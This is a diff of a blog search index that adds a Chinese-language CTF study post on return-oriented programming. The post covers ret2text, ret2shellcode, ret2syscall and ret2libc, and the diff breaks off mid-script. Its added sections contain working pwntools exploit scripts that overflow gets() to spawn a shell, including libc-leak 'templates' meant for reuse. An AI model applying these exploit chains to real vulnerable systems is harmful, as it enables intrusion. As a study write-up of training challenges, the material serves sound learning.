@@ -30,7 +30,7 @@
   <entry>
     <title>基本 ROP</title>
     <url>/2025/03/29/%E5%9F%BA%E6%9C%AC%20ROP/</url>
-    <content><![CDATA[<p>一些学习记录</p>
+    <content><![CDATA[<p>学习记录</p>
 <span id="more"></span>
 <p><font style="color:rgba(0, 0, 0, 0.87);">来源：</font><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">CTF-Wiki</a></p>
 <p>返回导向编程（Return-Oriented Programming，缩写：ROP）是计算机安全中的一种漏洞利用技术，该技术允</p>
@@ -47,7 +47,7 @@
 
 
 <p>checksec</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ret2text checksec ret2text</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
 
 <p><font style="color:rgba(0, 0, 0, 0.87);">可以看出程序是 32 位程序，且仅开启了栈不可执行保护。接下来我们使用 IDA 反编译该程序：</font></p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>);</span><br><span class="line">    gets((<span class="type">char</span> *)&amp;v4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Maybe I will tell you next time !&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -82,7 +82,7 @@ ret2shellcode是指当数据段中有可写可执行段时，向该段中写入�
 <p>由于shellcode需要填充，并且控制程序执行shellcode，故填充的区域需要具有可执行权限。</p>
 <p>以ctf-wiki中的题为例：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p>
 <p>checksec</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/kali/Desktop/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/kali/Desktop/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>
 
 <p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。</p>
 <p>IDA打开：</p>
@@ -103,6 +103,7 @@ ret2shellcode是指当数据段中有可写可执行段时，向该段中写入�
 <p><font style="color:rgba(0, 0, 0, 0.87);">依次输入:</font></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb pwn</span><br><span class="line">b main</span><br><span class="line">r</span><br><span class="line">vmmap</span><br></pre></td></tr></table></figure>
 
+<p>得到：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">Start      End        Perm      Name</span><br><span class="line">0x08048000 0x08049000 r-xp      /home/kali/Desktop/pwn</span><br><span class="line">0x08049000 0x0804a000 r--p      /home/kali/Desktop/pwn</span><br><span class="line">0x0804a000 0x0804b000 rw-p      /home/kali/Desktop/pwn</span><br><span class="line">0xf7d67000 0xf7d8a000 r--p      /usr/lib/i386-linux-gnu/libc.so.6</span><br></pre></td></tr></table></figure>
 
 <p><font style="color:rgba(0, 0, 0, 0.87);">通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限：</font></p>
@@ -139,7 +140,7 @@ ret2shellcode是指当数据段中有可写可执行段时，向该段中写入�
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=b&#x27;a&#x27;*offest+p64(rdi_addr)+p64(binsh_addr)+p64(rax_rdx_rbx_addr)+p64(0x3b)+p64(0x0)+p64(0X0)+p64(rsi_addr)+p64(0x0)+p64(syscall_addr)</span><br></pre></td></tr></table></figure>
 
 <p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
-<p><font style="color:rgba(0, 0, 0, 0.87);">以ctf-wiki中的题为例：</font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">以ctf-wiki中的题为例：</font><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p>
 <p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
 <p><font style="color:rgba(0, 0, 0, 0.87);">checksec</font></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/kali/Desktop/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>
@@ -224,21 +225,153 @@ ret2shellcode是指当数据段中有可写可执行段时，向该段中写入�
 
 <p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
 <h2 id="VKYue"><font style="color:rgba(0, 0, 0, 0.87);">ret2libc</font></h2>
-<font style="color:rgba(0, 0, 0, 0.87);"></font>
+<font style="color:rgba(0, 0, 0, 0.87);">libc是Linux下的ANSI C的函数库，ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。ret2libc类比之前介绍的三种方法，从字面意思看就是控制返回地址找libc中库函数存在的方法。</font>
 
 <p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">一般情况下，我们使用ret2libc主要针对动态链接编译的程序，程序动态链接了libc.so等动态链接库，虽然程序本身并没有用到system等危险函数，但是动态链接库中存在大量的可利用函数，就产生了新的攻击方式，从这些动态链接库中找可利用片段，拼接成恶意代码并控制rip跳转执行。</font></p>
 <p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
+<h3 id="nySln"><font style="color:rgba(0, 0, 0, 0.87);">ret2libc1</font></h3>
+system 和 /bin/sh 都存在。
+
+
+
+<p><font style="color:rgba(0, 0, 0, 0.87);">以ctf-wiki中的题为例：</font><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a></p>
 <p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">首先，我们检查一下程序的安全保护：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/kali/Desktop/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgba(0, 0, 0, 0.87);">32位小端序，开启了NX保护</font></p>
 <p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">IDA打开</font></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgba(0, 0, 0, 0.87);">可以看到在执行 gets 函数的时候出现了栈溢出，偏移量为：0x64+4+4+4。</font></p>
 <p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">然后寻找 system 函数和字符串 &#x2F;bin&#x2F;sh</font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">&#x2F;bin&#x2F;sh：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rodata:08048720 2F 62 69 6E 2F 73 68 00       aBinSh db &#x27;/bin/sh&#x27;,0                   ; DATA XREF: .data:shell↓o</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgba(0, 0, 0, 0.87);">system：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD:08048303 73 79 73 74 65 6D 00          aSystem db &#x27;system&#x27;,0                   ; DATA XREF: LOAD:08048218↑o</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgba(0, 0, 0, 0.87);">那么，我们直接返回该处，即执行 system 函数。</font></p>
 <p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">EXP：</font></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x64</span>+<span class="number">4</span>+<span class="number">4</span>+<span class="number">4</span></span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*offset + p32(system_plt) + p32(<span class="number">0x0</span>) + p64(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(0, 0, 0);">32位的分布是这样子的，返回地址+下一次的返回地址+参数1+参数2+…</font></p>
+<p><font style="color:rgb(0, 0, 0);">我们下一次返回地址是啥都行，因为我们拿到shell就跑了，可以直接为0，也可以是真实的地址（最好是）</font></p>
+<p><font style="color:rgb(0, 0, 0);"></font></p>
+<h3 id="bdt8n"><font style="color:rgba(0, 0, 0, 0.87);">ret2libc2</font></h3>
+没有 /bin/sh 。
+
+
+
+<p><font style="color:rgba(0, 0, 0, 0.87);">以ctf-wiki中的题为例：</font><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">ret2libc2</a></p>
 <p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">首先，我们检查一下程序的安全保护：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/kali/Desktop/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgba(0, 0, 0, 0.87);">32位小端序，开启了NX保护</font></p>
 <p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">IDA打开</font></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Something surprise here, but I don&#x27;t think it will work.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;What do you think ?&quot;</span>);</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgba(0, 0, 0, 0.87);">执行 gets 函数的时候出现了栈溢出，偏移量为：0x64+4+4+4。</font></p>
 <p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">system：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD:0804831A 73 79 73 74 65 6D 00          aSystem db &#x27;system&#x27;,0                   ; DATA XREF: LOAD:08048228↑o</span><br></pre></td></tr></table></figure>
+
+<p>没有找到 &#x2F;bin&#x2F;sh </p>
 <p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
+<p>尽管没有 &#x2F;bin&#x2F;sh ，但程序中调用了 gets 函数，如此，字符串 bin&#x2F;sh 可以通过 gets 函数输入。</p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">那么，接下来需要解决的问题就是，字符串 &#x2F;bin&#x2F;sh 通过 gets 函数输入到哪里进行存储？</font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">不能在溢出点 s 存储，因为在溢出位置输入字符串，然后再劫持回来执行system函数，会覆盖数据。</font></p>
 <p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">这里向程序中 bss 段的 buf2 处写入 &#x2F;bin&#x2F;sh 字符串</font></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804A080                               public buf2</span><br></pre></td></tr></table></figure>
+
 <p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">查看 bss 段的 buf2 是否可读、可写、可执行</font></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 依次输入</span><br><span class="line">gdb ret2libc2</span><br><span class="line">start</span><br><span class="line">vmmap</span><br></pre></td></tr></table></figure>
+
+<p>找到：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0804a000 0x0804b000 rw-p      /home/kali/Desktop/pwn</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgba(0, 0, 0, 0.87);">确实可读、可写、可执行。</font></p>
 <p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">EXP：</font></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x64</span>+<span class="number">4</span>+<span class="number">4</span>+<span class="number">4</span></span><br><span class="line">sys_addr=<span class="number">0x8048490</span></span><br><span class="line">gets_addr=<span class="number">0x8048460</span></span><br><span class="line">bss_addr=<span class="number">0x804A080</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*offset +p32(gets_addr)+p32(sys_addr)+p32(bss_addr)+p32(bss_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)    <span class="comment"># 先发送构造好的 payload，触发缓冲区溢出，覆盖返回地址，实现函数链调用。</span></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)  <span class="comment"># 再发送字符串 /bin/sh，此字符串通过 gets() 写入到 bss 段（bss_addr），最终作为 system() 的参数调用，打开 shell。</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.87);&quot;&gt;b&#39;a&#39;*112&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.87);">：填充 112 个字符以覆盖缓冲区（及覆盖掉函数调用时保存的 EBP），为覆盖返回地址做准备。</font></li>
+<li><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.87);&quot;&gt;p32(gets_addr)&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.87);">：覆盖返回地址，使得函数返回时跳转到 gets() 函数。（后面的发送 ‘&#x2F;bin&#x2F;sh’ 就会使用这个 gets 函数）</font></li>
+<li><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.87);&quot;&gt;p32(sys_addr)&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.87);">：gets() 执行完毕后返回时，跳转到 system() 函数。</font></li>
+<li><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.87);&quot;&gt;p32(bss_addr)&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.87);">（第一次）：作为 gets() 的参数，即 gets() 会把输入写入这个地址。（也就是 &#x2F;bin&#x2F;sh ）</font></li>
+<li><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.87);&quot;&gt;p32(bss_addr)&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.87);">（第二次）：作为 system() 的参数，即 system(bss_addr) 将执行存储在 bss_addr 处的 “&#x2F;bin&#x2F;sh”。</font></li>
+</ul>
+<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
+<h3 id="tdUNO"><font style="color:rgba(0, 0, 0, 0.87);">ret2libc3</font></h3>
+<font style="color:rgba(0, 0, 0, 0.87);">system 和 /bin/sh 都不存在。</font>
+
+<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">以ctf-wiki中的题为例：</font><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3</a></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">首先，我们检查一下程序的安全保护：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/kali/Desktop/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgba(0, 0, 0, 0.87);">32位小端序，开启了NX保护</font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">IDA打开</font></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No surprise anymore, system disappeard QQ.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Can you find it !?&quot;</span>);</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgba(0, 0, 0, 0.87);">依旧是执行 gets 函数的时候出现了栈溢出，偏移量为：0x64+4+4+4。</font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
+<p>检查后发现没有 system 函数和字符串 &#x2F;bin&#x2F;sh 。这时我们需要在函数动态绑定的 libc 中找，例如经常使用的</p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">system、&#x2F;bin&#x2F;sh字符串。</font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
+<p>找 libc.so 版本：</p>
+<ul>
+<li><font style="color:rgba(0, 0, 0, 0.87);"></font><a href="https://libc.blukat.me/">https://libc.blukat.me/</a></li>
+<li><a href="https://github.com/lieanu/LibcSearcher">LibcSearcher</a></li>
+</ul>
+<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
+<p>总的来说：</p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">1、通过第一次溢出，通过将 puts 的 PLT 地址放到返回处，泄漏出执行过的函数的 GOT 地址（实际上 puts 的就可以）</font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">2、将 puts 的返回地址设置为 _start 函数（main () 函数是用户代码的入口，是对用户而言的；而_start () 函数是系统代码的入口，是程序真正的入口），方便再次用来执行 system(‘&#x2F;bin&#x2F;sh’)</font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">3、通过泄露的函数的 GOT 地址计算出 libc 中的 system 和 &#x2F;bin&#x2F;sh 的地址</font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">4、再次通过溢出将返回地址覆盖成泄露出来的 system 的地址 getshell</font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">EXP：</font></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span> + p32(puts_plt) + p32(start_addr) + p32(puts_got)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;!?&quot;</span>,payload1)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span> + p32(system_addr) + p32(<span class="number">1234</span>) + p32(binsh_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;!?&quot;</span>,payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
+<h3 id="gnqOP"><font style="color:rgba(0, 0, 0, 0.87);">模板</font></h3>
+write_32（来源：[32位程序libc题型模板](https://blog.csdn.net/qq_51032807/article/details/114808339)）
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote()</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc____&quot;</span>)      <span class="comment"># 题目提供的 lic 文件</span></span><br><span class="line">e = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt_addr = e.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got_addr = e.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = e.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">offset = ???</span><br><span class="line">payload = offset*<span class="string">b&#x27;a&#x27;</span> + p32(write_plt_addr) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got_addr) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">write_offset = libc.symbols[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_offset = libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">base_addr = write_addr - write_offset</span><br><span class="line">system_addr = base_addr + system_offset</span><br><span class="line">binsh_addr = base_addr + binsh_offset</span><br><span class="line"></span><br><span class="line">payload = offset*<span class="string">b&#x27;a&#x27;</span> + p32(system_addr) + p32(<span class="number">1</span>) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r.recvuntil()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>puts_32</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote()</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = e.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line">offset = ???</span><br><span class="line">payload1 = offset*<span class="string">b&#x27;a&#x27;</span> + p32(puts_plt) + p32(start_addr) + p32(puts_got)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil()</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#p.recvline() x ???       （有时候需要接收信息才能打印地址，具体需要接收多少次自己试）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span 